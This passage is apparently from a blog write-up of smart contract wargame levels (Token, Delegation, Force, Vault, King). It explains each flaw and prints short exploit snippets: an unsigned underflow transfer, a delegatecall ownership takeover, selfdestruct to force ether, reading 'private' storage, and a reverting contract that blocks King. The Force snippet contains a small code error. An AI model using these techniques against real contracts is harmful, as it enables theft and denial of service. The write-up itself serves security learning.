</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">13</span><span>        victimContract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">changeOwner</span><span class="token" style="color:#d4d4d4">(</span><span>newOwner</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">14</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">15</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">16</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">Challenge solved ✅</p>
<h2 class="chakra-heading css-1uc67dn" id="token">Token</h2>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Analysis</span></p>
<p class="chakra-text css-0" node="[object Object]">This challenge is about <span class="chakra-text css-gv9qss">unsigned integers</span>. We need to be extra duper careful when handling them as they <em>overlap</em>. What does that mean ?</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-c" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span>uint8 X</span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#b5cea8">255</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span>X</span><span class="token" style="color:#d4d4d4">=</span><span>X</span><span class="token" style="color:#d4d4d4">+</span><span class="token" style="color:#b5cea8">1</span><span> </span><span class="token" style="color:#6a9955">// X = 0 ;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">Now you see it.</p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138020/61490e01f7f4c0dcaaa9366ce4607e17714ff36452e562e06c8bcd0d048c335a_df2hde.png" alt="Token method" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Token method</p></div></div></p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span> </span><span class="token" style="color:#dcdcaa">require</span><span class="token" style="color:#d4d4d4">(</span><span>balances</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">-</span><span> _value </span><span class="token" style="color:#d4d4d4">&gt;=</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span> </span><span class="token" style="color:#6a9955">// How about we pass a big value to this poor unsigned balances[msg.sender] ?</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span>
</span></code></div></pre>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Exploitation</span></p>
<p class="chakra-text css-0" node="[object Object]">We got 20 tokens, So I will be generous and give more than I own.</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span> </span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">transfer</span><span class="token" style="color:#d4d4d4">(</span><span>player</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#b5cea8">21</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">Challenge solved ✅</p>
<h2 class="chakra-heading css-1uc67dn" id="delegation">Delegation</h2>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Challenge description</span></p>
<p class="chakra-text css-0" node="[object Object]">The goal of this level is for you to claim ownership of the instance you are given.</p>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Analysis</span></p>
<p class="chakra-text css-0" node="[object Object]">Here we are exposed to the <code class="inline-code">delegateCall</code> function. If you don&#x27;t know what this function does I will try to sum it up. It&#x27;s a low level way to call a method of a contract ( in our case <code class="inline-code">pwn</code> ) in the context of another, it means it gets the storage values and global ones of the contract who called <code class="inline-code">delegateCall</code>.</p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138021/2549219ff5c11b36a370c12f1dfd8326925489a9207074b29dfd7f83621353bc_m6k8pd.png" alt="Delegation pwn" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Delegation pwn</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138019/7358cfd1b967281caa40f09ba74e6e9be2e11dce5bb005022749902ece0d530a_vpu7ji.png" alt="Delegation fallback" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Delegation fallback</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">Okay so what is <em>msg.data</em> ?
msg.data can be the function selector with the parameters in a bytes encoded format</p>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Exploitation</span></p>
<p class="chakra-text css-0" node="[object Object]">I wrote a contract to get the bytes, we can also use <code class="inline-code">web3.eth.abi.encodeFunctionCall</code> from the console.</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span>contract </span><span class="token" style="color:#4ec9b0">Utility</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span>     </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">pwnEncoded</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> pure </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">bytes memory</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span>      </span><span class="token" style="color:#c586c0">return</span><span> abi</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">encodeWithSignature</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;pwn()&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span> 
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span>
</span></code></div></pre>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">sendTransaction</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">{</span><span class="token literal-property" style="color:#9cdcfe">data</span><span class="token" style="color:#d4d4d4">:</span><span>valueFromContract</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">Challenge solved ✅</p>
<h2 class="chakra-heading css-1uc67dn" id="force">Force</h2>
<p class="chakra-text css-0" node="[object Object]">We will learn another capability of smart contracts which sometimes became problematic if we rely on it.</p>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Challenge description</span></p>
<p class="chakra-text css-0" node="[object Object]">The goal of this level is to make the balance of the contract greater than zero.</p>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Analysis</span></p>
<p class="chakra-text css-0" node="[object Object]">Nothing to see there the contract is pretty empty. But a big security consideration that no contract can prevent incoming ethers from the blockchain. All we can do is not rely the contract balance in our contract logic.</p>
<p class="chakra-text css-0" node="[object Object]"><a class="chakra-link css-9olwc6" href="https://docs.soliditylang.org/en/develop/security-considerations.html">Link for more informations</a></p>
<p class="chakra-text css-0" node="[object Object]">So what is the method to send ethers to an empty contract or let&#x27;s say a contract that has logic which tries to prevent incoming ethers. A quick googling and I came to the answer it&#x27;s the method <code class="inline-code">selfdestruct(address)</code></p>
<blockquote>
<p class="chakra-text css-0" node="[object Object]">The only way to remove code from the blockchain is when a contract at that address performs the selfdestruct operation. The remaining Ether stored at that address is sent to a designated target and then the storage and code is removed from the state</p>
</blockquote>
<p class="chakra-text css-0" node="[object Object]"><a class="chakra-link css-9olwc6" href="https://docs.soliditylang.org/en/develop/introduction-to-smart-contracts.html?highlight=selfdestruct#deactivate-and-self-destruct">Docs Link</a></p>
<p class="chakra-text css-0" node="[object Object]">We got everything we need now let&#x27;s hack !</p>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Exploitation</span></p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span>contract </span><span class="token" style="color:#4ec9b0">EvilContract</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span> 
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span>    </span><span class="token" style="color:#6a9955">// payable public so we can send it some ether to pass.</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">forceSendBySacrifice</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">address victimAddress</span><span class="token" style="color:#d4d4d4">)</span><span> payable </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span>        </span><span class="token" style="color:#dcdcaa">selfdestruct</span><span class="token" style="color:#d4d4d4">(</span><span>_address</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span>
</span></code></div></pre>
<h2 class="chakra-heading css-1uc67dn" id="vault">Vault</h2>
<p class="chakra-text css-0" node="[object Object]"><code class="inline-code">transparency has no limits</code></p>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Challenge description</span></p>
<p class="chakra-text css-0" node="[object Object]">Unlock the vault to pass the level!</p>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Analysis</span></p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138026/e9446fa1dc73bdd6238eccf71218b163311ff773cb9ef02980f39ab6443d8e0a_auuwqt.png" alt="Vault storage" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Vault storage</p></div></div><br/>
<div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138020/109330cb4bbe2a93530a4c5a6bda285a392f0d2878464d1a581cc5b240a4a3ee_somrgz.png" alt="Vault method" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Vault method</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">The private keyword of solidity is quite tricky. Private variables limit their scopes to the contract so they can&#x27;t be viewed or accessed by other <span class="chakra-text css-gv9qss">contracts</span> logic. However anyone can view the variable values. This challenge is simple and all we have to understand is the storage is a key value store where the keys are from 0 to 2^256.</p>
<p class="chakra-text css-0" node="[object Object]">Here we can see got two storage variables <code class="inline-code">locked</code> and <code class="inline-code">password</code>. I highly encouraging reading the docs <a class="chakra-link css-9olwc6" href="https://docs.soliditylang.org/en/develop/internals/layout_in_storage.html?highlight=storage">Storage solidity Docs</a> to understand how these variables are layed out.</p>
<p class="chakra-text css-0" node="[object Object]">bytes32 will take a whole slot so it can share the slot with locked. We will have then :</p>
<p class="chakra-text css-0" node="[object Object]"><em>slot0</em>  <code class="inline-code">locked</code>
<em>solt1</em>  <code class="inline-code">password</code></p>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Exploitation</span></p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span> </span><span class="token" style="color:#569CD6">const</span><span> password </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#c586c0">await</span><span> web3</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">eth</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">getStorageAt</span><span class="token" style="color:#d4d4d4">(</span><span>address</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">1</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span> </span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">unlock</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">Challenge solved ✅</p>
<h2 class="chakra-heading css-1uc67dn" id="king">King</h2>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Challenge description</span></p>
<p class="chakra-text css-0" node="[object Object]">When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.</p>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Analysis</span></p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138016/26bbecde7b1eacd1313c83ad3cd9b8dc4aa55e3dacc9e5acf006ef155bcbc49c_x8mhfi.png" alt="King method" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">King method</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">Pretty interesting, at first sight you might find this function unbreakable ( as I did ). But then a good look to the transfer method. I was thinking in term of a user who will interact with this contract. How about another contract ?
If we go back to the <code class="inline-code">fallback</code> challenge we talked about <em>fallback</em> methods. Here when we call <code class="inline-code">transfer</code> a callback function of the contract to whom we are transferring funds to will be triggered.</p>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Exploitation</span></p>
<ol>
<li>Make our contract the king.</li>
<li>Our contract now revert the transaction and won&#x27;t step down from the throne 😈.</li>
</ol>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span>contract </span><span class="token" style="color:#4ec9b0">EvilContract</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span> 
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">becomeKing</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">address victimAddress</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> payable </span><span class="token" style="color:#d4d4d4">{</span><span> 
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span>        victimAddress</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">call</span><span class="token" style="color:#d4d4d4">{</span><span class="token literal-property" style="color:#9cdcfe">value</span><span class="token" style="color:#d4d4d4">:</span><span class="token" style="color:#b5cea8">1000000000000000000</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span><span>    </span><span class="token" style="color:#569CD6">function</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> external payable </span><span class="token" style="color:#d4d4d4">{</span><span> </span><span class="token" style="color:#6a9955">// fallback function definition</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span><span>        </span><span class="token" style="color:#dcdcaa">revert</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;The kingdom is mine now !&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">9</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">10</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">11</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">Challenge solved ✅</p>
<h2 class="chakra-heading css-1uc67dn" id="re-entrancy">Re-entrancy</h2>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Challenge description</span></p>
<p class="chakra-text css-0" node="[object Object]">The goal of this level is for you to steal all the funds from the contract.</p>
<div class="css-17l36zw"></div>
